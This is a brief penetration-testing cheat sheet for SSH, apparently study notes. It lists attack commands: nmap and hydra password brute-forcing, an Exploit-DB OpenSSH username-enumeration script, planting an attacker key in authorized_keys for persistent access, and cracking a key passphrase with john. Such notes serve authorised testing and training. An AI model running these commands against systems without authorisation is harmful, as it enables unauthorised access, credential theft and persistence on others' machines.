# SSH (TCP 22)

Nmap check

```
nmap -p 22 –script ssh-brute –script-args userdb=users.lst,passdb=pass.lst –script-args ssh-brute.timeout=4s $ip
```



User enumeration

<pre><code><strong>python /usr/share/exploitdb/exploits/linux/remote/40136.py -U /usr/share/wordlists/metasploit/unix_users.txt $ip
</strong></code></pre>



Brute force

```
 //For a root
 hydra -v -V -l root -P pass.txt $ip ssh
 
 //For a userlist
 hydra -v -V -L userlist.txt -P password-file.txt $ip ssh
```



Add LHOST ssh key to RHOST

```
// LHOST
ssh-keygen -f <FILENAME> -t <SSH ALG> -B <KEY SIZE>
chmod 600 <FILENAME>
cat <FILENAME>.pub -> copy

// RHOST
cat >> <PATH>/.ssh/authorized_keys

// LHOST
ssh -i <FILENAME> <USER>@<IP>
```



SSH key with passphrase

```
ssh2john.py passphrased_id > id.hash
john id.hash --wordlist=/usr/share/wordlists/rockyou.txt 
```
